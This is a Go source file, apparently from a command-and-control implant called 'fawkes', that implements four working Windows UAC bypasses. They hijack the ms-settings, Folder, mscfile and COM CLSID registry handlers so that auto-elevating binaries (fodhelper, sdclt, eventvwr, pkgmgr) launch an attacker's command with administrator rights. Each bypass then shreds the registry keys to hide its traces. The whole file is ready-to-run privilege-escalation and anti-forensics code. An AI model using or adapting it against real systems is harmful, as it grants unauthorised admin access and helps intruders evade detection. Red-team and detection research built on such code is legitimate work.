//go:build windows
// +build windows

package commands

import (
	"fmt"
	"time"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

// uacBypassMsSettings implements the ms-settings registry hijack used by both
// fodhelper.exe and computerdefaults.exe. Both auto-elevate and read
// HKCU\Software\Classes\ms-settings\Shell\Open\command for the handler.
func uacBypassMsSettings(command, triggerBinary, techniqueName string) structs.CommandResult {
	var output string
	output += fmt.Sprintf("[*] UAC Bypass Technique: %s\n", techniqueName)
	output += fmt.Sprintf("[*] Trigger binary: %s\n", triggerBinary)
	output += fmt.Sprintf("[*] Elevated command: %s\n\n", command)

	regKeyPath := `Software\Classes\ms-settings\Shell\Open\command`

	// Step 1: Create the registry key and set command
	output += "[*] Step 1: Setting registry key...\n"
	key, _, err := registry.CreateKey(registry.CURRENT_USER, regKeyPath, registry.SET_VALUE)
	if err != nil {
		return errorResult(output + fmt.Sprintf("Error creating HKCU\\%s: %v", regKeyPath, err))
	}

	// Set (Default) value to our command
	if err := key.SetStringValue("", command); err != nil {
		key.Close()
		return errorResult(output + fmt.Sprintf("Error setting command value: %v", err))
	}

	// Set DelegateExecute to empty string — this is critical.
	// Without it, Windows uses the normal ms-settings protocol handler.
	// With an empty DelegateExecute, Windows falls back to the (Default) command value.
	if err := key.SetStringValue("DelegateExecute", ""); err != nil {
		key.Close()
		cleanupMsSettingsKey()
		return errorResult(output + fmt.Sprintf("Error setting DelegateExecute: %v", err))
	}
	key.Close()
	output += fmt.Sprintf("[+] Registry set: HKCU\\%s\n", regKeyPath)

	// Step 2: Launch the auto-elevating trigger binary via ShellExecuteW.
	output += "[*] Step 2: Launching trigger binary via ShellExecute...\n"
	verbPtr, _ := windows.UTF16PtrFromString("open")
	filePtr, _ := windows.UTF16PtrFromString(triggerBinary)
	err = windows.ShellExecute(0, verbPtr, filePtr, nil, nil, 0 /* SW_HIDE */)
	if err != nil {
		cleanupMsSettingsKey()
		return errorResult(output + fmt.Sprintf("Error launching %s: %v", triggerBinary, err))
	}
	output += fmt.Sprintf("[+] Launched %s via ShellExecute\n", triggerBinary)

	// Step 3: Wait briefly then clean up registry
	jitterSleep(1500*time.Millisecond, 3*time.Second)
	output += "[*] Step 3: Cleaning up registry (shredding values)...\n"
	cleanupMsSettingsKey()
	output += "[+] Registry keys shredded and removed\n\n"

	output += "[+] UAC bypass triggered successfully.\n"
	output += "[*] If successful, a new elevated callback should appear shortly.\n"
	output += "[*] The elevated process runs at high integrity (admin)."

	return successResult(output)
}

// cleanupMsSettingsKey shreds values and removes the ms-settings hijack registry keys
func cleanupMsSettingsKey() {
	keyPath := `Software\Classes\ms-settings\Shell\Open\command`
	shredRegistryKey(registry.CURRENT_USER, keyPath)
	// Delete parent keys (deepest first)
	_ = registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\ms-settings\Shell\Open`)
	_ = registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\ms-settings\Shell`)
	_ = registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\ms-settings`)
}

// uacBypassSdclt implements the sdclt.exe Folder handler hijack.
// sdclt.exe auto-elevates and reads HKCU\Software\Classes\Folder\shell\open\command.
func uacBypassSdclt(command string) structs.CommandResult {
	sdcltPath := resolveSystem32Binary("sdclt.exe")

	var output string
	output += "[*] UAC Bypass Technique: sdclt\n"
	output += fmt.Sprintf("[*] Trigger binary: %s\n", sdcltPath)
	output += fmt.Sprintf("[*] Elevated command: %s\n\n", command)

	regKeyPath := `Software\Classes\Folder\shell\open\command`

	// Step 1: Create the registry key and set command
	output += "[*] Step 1: Setting registry key...\n"
	key, _, err := registry.CreateKey(registry.CURRENT_USER, regKeyPath, registry.SET_VALUE)
	if err != nil {
		return errorResult(output + fmt.Sprintf("Error creating HKCU\\%s: %v", regKeyPath, err))
	}

	if err := key.SetStringValue("", command); err != nil {
		key.Close()
		return errorResult(output + fmt.Sprintf("Error setting command value: %v", err))
	}

	if err := key.SetStringValue("DelegateExecute", ""); err != nil {
		key.Close()
		cleanupSdcltKey()
		return errorResult(output + fmt.Sprintf("Error setting DelegateExecute: %v", err))
	}
	key.Close()
	output += fmt.Sprintf("[+] Registry set: HKCU\\%s\n", regKeyPath)

	// Step 2: Launch sdclt.exe via ShellExecuteW
	output += "[*] Step 2: Launching sdclt.exe via ShellExecute...\n"
	verbPtr, _ := windows.UTF16PtrFromString("open")
	filePtr, _ := windows.UTF16PtrFromString(sdcltPath)
	err = windows.ShellExecute(0, verbPtr, filePtr, nil, nil, 0 /* SW_HIDE */)
	if err != nil {
		cleanupSdcltKey()
		return errorResult(output + fmt.Sprintf("Error launching sdclt.exe: %v", err))
	}
	output += "[+] Launched sdclt.exe via ShellExecute\n"

	// Step 3: Clean up registry in background goroutine.
	go func() {
		jitterSleep(1500*time.Millisecond, 3*time.Second)
		cleanupSdcltKey()
	}()

	output += "[*] Registry cleanup scheduled (background)\n\n"
	output += "[+] UAC bypass triggered successfully.\n"
	output += "[*] If successful, a new elevated callback should appear shortly.\n"
	output += "[*] The elevated process runs at high integrity (admin)."

	return successResult(output)
}

// cleanupSdcltKey shreds values and removes the Folder handler hijack registry keys
func cleanupSdcltKey() {
	keyPath := `Software\Classes\Folder\shell\open\command`
	shredRegistryKey(registry.CURRENT_USER, keyPath)
	_ = registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\Folder\shell\open`)
	_ = registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\Folder\shell`)
	// Don't delete Software\Classes\Folder — it may have legitimate content
}

// uacBypassEventvwr implements the Event Viewer mscfile handler hijack.
// eventvwr.exe auto-elevates and opens eventvwr.msc via HKCU\Software\Classes\mscfile.
func uacBypassEventvwr(command string) structs.CommandResult {
	eventvwrPath := resolveSystem32Binary("eventvwr.exe")

	var output string
	output += "[*] UAC Bypass Technique: eventvwr\n"
	output += fmt.Sprintf("[*] Trigger binary: %s\n", eventvwrPath)
	output += fmt.Sprintf("[*] Elevated command: %s\n\n", command)

	regKeyPath := `Software\Classes\mscfile\Shell\Open\command`

	output += "[*] Step 1: Setting registry key...\n"
	key, _, err := registry.CreateKey(registry.CURRENT_USER, regKeyPath, registry.SET_VALUE)
	if err != nil {
		return errorResult(output + fmt.Sprintf("Error creating HKCU\\%s: %v", regKeyPath, err))
	}

	if err := key.SetStringValue("", command); err != nil {
		key.Close()
		return errorResult(output + fmt.Sprintf("Error setting command value: %v", err))
	}
	key.Close()
	output += fmt.Sprintf("[+] Registry set: HKCU\\%s\n", regKeyPath)

	output += "[*] Step 2: Launching eventvwr.exe via ShellExecute...\n"
	verbPtr, _ := windows.UTF16PtrFromString("open")
	filePtr, _ := windows.UTF16PtrFromString(eventvwrPath)
	err = windows.ShellExecute(0, verbPtr, filePtr, nil, nil, 0 /* SW_HIDE */)
	if err != nil {
		cleanupEventvwrKey()
		return errorResult(output + fmt.Sprintf("Error launching eventvwr.exe: %v", err))
	}
	output += "[+] Launched eventvwr.exe via ShellExecute\n"

	go func() {
		jitterSleep(1500*time.Millisecond, 3*time.Second)
		cleanupEventvwrKey()
	}()

	output += "[*] Registry cleanup scheduled (background)\n\n"
	output += "[+] UAC bypass triggered successfully.\n"
	output += "[*] If successful, a new elevated callback should appear shortly.\n"
	output += "[*] The elevated process runs at high integrity (admin)."

	return successResult(output)
}

// cleanupEventvwrKey shreds values and removes the mscfile hijack registry keys
func cleanupEventvwrKey() {
	keyPath := `Software\Classes\mscfile\Shell\Open\command`
	shredRegistryKey(registry.CURRENT_USER, keyPath)
	_ = registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\mscfile\Shell\Open`)
	_ = registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\mscfile\Shell`)
	_ = registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\mscfile`)
}

// uacBypassDismhost exploits the DISM Package Manager COM object by registering
// a LocalServer32 handler in HKCU. When pkgmgr.exe auto-elevates and CoCreates
// this CLSID, COM resolution checks HKCU first and launches our command.
func uacBypassDismhost(command string) structs.CommandResult {
	pkgmgrPath := resolveSystem32Binary("pkgmgr.exe")

	var output string
	output += "[*] UAC Bypass Technique: dismhost (COM CLSID hijack)\n"
	output += fmt.Sprintf("[*] Trigger binary: %s\n", pkgmgrPath)
	output += fmt.Sprintf("[*] Elevated command: %s\n\n", command)

	clsid := `{3ad05575-8857-4850-9277-11b85bdb8e09}`
	clsidKeyPath := `Software\Classes\CLSID\` + clsid
	localServerPath := clsidKeyPath + `\LocalServer32`

	output += "[*] Step 1: Registering COM CLSID hijack in HKCU...\n"
	key, _, err := registry.CreateKey(registry.CURRENT_USER, localServerPath, registry.SET_VALUE)
	if err != nil {
		return errorResult(output + fmt.Sprintf("Error creating HKCU\\%s: %v", localServerPath, err))
	}
	if err := key.SetStringValue("", command); err != nil {
		key.Close()
		return errorResult(output + fmt.Sprintf("Error setting LocalServer32 value: %v", err))
	}
	key.Close()
	output += fmt.Sprintf("[+] COM CLSID registered: HKCU\\%s\n", localServerPath)

	output += "[*] Step 2: Launching pkgmgr.exe via ShellExecute...\n"
	verbPtr, _ := windows.UTF16PtrFromString("open")
	filePtr, _ := windows.UTF16PtrFromString(pkgmgrPath)
	err = windows.ShellExecute(0, verbPtr, filePtr, nil, nil, 0 /* SW_HIDE */)
	if err != nil {
		cleanupDismhostKey(clsid)
		return errorResult(output + fmt.Sprintf("Error launching pkgmgr.exe: %v", err))
	}
	output += "[+] Launched pkgmgr.exe via ShellExecute\n"

	jitterSleep(2*time.Second, 4*time.Second)
	output += "[*] Step 3: Cleaning up COM CLSID registration (shredding)...\n"
	cleanupDismhostKey(clsid)
	output += "[+] CLSID keys shredded and removed\n\n"

	output += "[+] UAC bypass triggered successfully.\n"
	output += "[*] If successful, a new elevated callback should appear shortly.\n"
	output += "[*] The elevated process runs at high integrity (admin)."

	return successResult(output)
}

// cleanupDismhostKey shreds values and removes the COM CLSID hijack registry keys
func cleanupDismhostKey(clsid string) {
	basePath := `Software\Classes\CLSID\` + clsid
	shredRegistryKey(registry.CURRENT_USER, basePath+`\LocalServer32`)
	_ = registry.DeleteKey(registry.CURRENT_USER, basePath+`\LocalServer32`)
	_ = registry.DeleteKey(registry.CURRENT_USER, basePath)
}
